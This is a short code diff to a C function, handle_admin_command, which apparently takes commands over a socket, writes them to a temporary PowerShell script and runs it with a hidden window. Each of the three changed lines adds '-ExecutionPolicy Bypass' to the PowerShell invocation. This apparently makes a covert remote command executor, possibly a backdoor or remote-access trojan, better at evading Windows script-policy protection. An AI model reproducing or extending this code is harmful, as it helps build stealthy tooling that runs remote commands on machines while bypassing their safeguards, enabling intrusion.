@@ -230,7 +230,7 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
             fclose(f);
             
             char runCmd[MAX_PATH + 64];
-            snprintf(runCmd, sizeof(runCmd), "powershell -WindowStyle Hidden -File \"%s\"", psPath);
+            snprintf(runCmd, sizeof(runCmd), "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%s\"", psPath);
             result = sys_run_command(runCmd);
         } else {
             result = "[Failed to write temp script]";
@@ -264,7 +264,7 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
             fclose(f);
             
             char runCmd[MAX_PATH + 64];
-            snprintf(runCmd, sizeof(runCmd), "powershell -WindowStyle Hidden -File \"%s\"", psPath);
+            snprintf(runCmd, sizeof(runCmd), "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%s\"", psPath);
             result = sys_run_command(runCmd);
         } else {
             result = "[Failed to write temp script]";
@@ -284,7 +284,7 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
             fclose(f);
             
             char runCmd[MAX_PATH + 64];
-            snprintf(runCmd, sizeof(runCmd), "powershell -WindowStyle Hidden -File \"%s\"", psPath);
+            snprintf(runCmd, sizeof(runCmd), "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%s\"", psPath);
             result = sys_run_command(runCmd);
         } else {
             result = "[Failed to write temp script]";
